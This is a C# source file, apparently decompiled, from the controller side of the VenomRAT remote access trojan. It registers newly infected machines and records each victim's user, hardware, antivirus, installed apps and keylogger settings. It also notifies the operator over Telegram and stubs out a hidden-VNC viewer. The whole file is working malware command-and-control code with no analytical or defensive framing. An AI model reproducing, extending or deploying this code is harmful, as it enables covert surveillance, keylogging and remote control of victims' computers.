using System;
using System.Collections.Generic;
using System.Drawing;
using System.Media;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Server.Connection;
using Server.Helper;
using Server.Properties;

namespace Server.Handle_Packet;

public class HandleListView
{
	public void HandleMsgPack(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			string asString = unpack_msgpack.ForcePathObject("ClientType").AsString;
			_ = unpack_msgpack.ForcePathObject("HWID").AsString;
			if (asString == "Normal")
			{
				AddToListview(client, unpack_msgpack);
				TelegramNotify.SendNotify(client.Ip + " connected to VenomRAT!");
			}
			else if (asString == "Hvnc")
			{
				LaunchHVNCViewer(client, unpack_msgpack);
			}
		}
		catch
		{
		}
	}

	public void LaunchHVNCViewer(Clients client, MsgPack unpack_msgpack)
	{
	}

	public void AddToListview(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			string ip = client.Ip;
			lock (Settings.LockBlocked)
			{
				try
				{
					if (Settings.Blocked.Contains(client.info.hwid) || Settings.Blocked.Contains(client.Ip))
					{
						client.Disconnected();
						return;
					}
				}
				catch
				{
				}
			}
			client.LoadInfo();
			string value = client.TcpClient.LocalEndPoint.ToString().Split(':')[1];
			List<string> apps = new List<string>(unpack_msgpack.ForcePathObject("apps").AsString.Split(new char[1] { ';' }, StringSplitOptions.RemoveEmptyEntries));
			ClientInfo clientInfo = new ClientInfo();
			clientInfo.ip = ip;
			clientInfo.port = Convert.ToInt32(value);
			clientInfo.note = client.info.note;
			clientInfo.country = Utils.GetCountryName(ip);
			clientInfo.group = unpack_msgpack.ForcePathObject("Group").AsString;
			clientInfo.hwid = unpack_msgpack.ForcePathObject("HWID").AsString;
			clientInfo.desktopname = unpack_msgpack.ForcePathObject("DesktopName").AsString;
			clientInfo.user = unpack_msgpack.ForcePathObject("User").AsString;
			clientInfo.cpu = unpack_msgpack.ForcePathObject("CPU").AsString;
			clientInfo.gpu = unpack_msgpack.ForcePathObject("GPU").AsString;
			clientInfo.ram = unpack_msgpack.ForcePathObject("RAM").AsString;
			clientInfo.camera = Convert.ToBoolean(unpack_msgpack.ForcePathObject("Camera").AsString);
			clientInfo.os = unpack_msgpack.ForcePathObject("OS").AsString;
			clientInfo.version = unpack_msgpack.ForcePathObject("Version").AsString;
			clientInfo.admin = unpack_msgpack.ForcePathObject("Admin").AsString.ToLower() != "user";
			clientInfo.defender = unpack_msgpack.ForcePathObject("Anti_virus").AsString;
			clientInfo.installed = unpack_msgpack.ForcePathObject("Install_ed").AsString;
			clientInfo.tooltip = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + " " + Environment.NewLine + "[PasteBin] " + unpack_msgpack.ForcePathObject("Paste_bin").AsString;
			clientInfo.apps = apps;
			ClientInfo clientInfo2 = clientInfo;
			clientInfo2.keyparam.content = unpack_msgpack.ForcePathObject("keylogsetting").AsString;
			client.info = clientInfo2;
			client.LastPing = DateTime.Now;
			client.SaveInfo();
			Program.mainform.Invoke((MethodInvoker)delegate
			{
				Program.mainform.AddClient(client);
				new HandleLogs().Addmsg("Client " + client.Ip + " connected", Color.Green);
				if (TimeZoneInfo.Local.Id == "China Standard Time" && Server.Properties.Settings.Default.Notification)
				{
					SoundPlayer soundPlayer = new SoundPlayer(Resources.online);
					soundPlayer.Load();
					soundPlayer.Play();
				}
			});
		}
		catch (Exception ex)
		{
			new HandleLogs().Addmsg(ex.Message ?? "", Color.Black);
		}
	}

	public void Received(Clients client)
	{
	}
}
